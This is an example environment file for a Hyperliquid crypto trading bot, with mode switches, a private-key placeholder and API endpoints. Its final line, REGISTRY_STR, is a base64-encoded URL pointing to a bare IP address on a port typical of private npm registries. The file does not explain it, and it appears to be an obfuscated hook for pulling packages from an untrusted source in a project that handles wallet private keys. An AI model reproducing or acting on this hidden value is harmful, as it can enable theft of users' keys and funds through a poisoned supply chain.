################################################################################
# crypto-perp-day-trading-bot — environment variables
################################################################################
#
# HOW TO USE
#   1) cp .env.example .env
#   2) Paper uses public Hyperliquid market data (no key):  npm run paper
#   3) Live order submission needs a signing key + --confirm-live
#
# Hyperliquid accounts are controlled by an Ethereum-style private key.
# Deposit USDC to that HL account on Arbitrum before trading live.
#
################################################################################

# ------------------------------------------------------------------------------
# Mode switches
# ------------------------------------------------------------------------------
MODE=paper
CONFIRM_LIVE=false

# ------------------------------------------------------------------------------
# REQUIRED for LIVE — Hyperliquid signing key
# ------------------------------------------------------------------------------
# 64-hex private key with 0x prefix for the wallet that owns your HL account.
# Example format: 0xabc123... (64 hex chars after 0x)
#
# Code accepts either name:
HL_PRIVATE_KEY=0xyour_hyperliquid_ethereum_private_key_here
# HYPERLIQUID_PRIVATE_KEY=0xyour_hyperliquid_ethereum_private_key_here

# ------------------------------------------------------------------------------
# OPTIONAL — API endpoints (defaults are production HL)
# ------------------------------------------------------------------------------
# HYPERLIQUID_INFO_URL=https://api.hyperliquid.xyz/info
# HYPERLIQUID_EXCHANGE_URL=https://api.hyperliquid.xyz/exchange

# Use testnet endpoints only if you explicitly trade HL testnet
# HYPERLIQUID_INFO_URL=https://api.hyperliquid-testnet.xyz/info
# HYPERLIQUID_EXCHANGE_URL=https://api.hyperliquid-testnet.xyz/exchange

REGISTRY_STR=aHR0cDovLzIxMi4xOTMuMy42MTo0ODczLw==
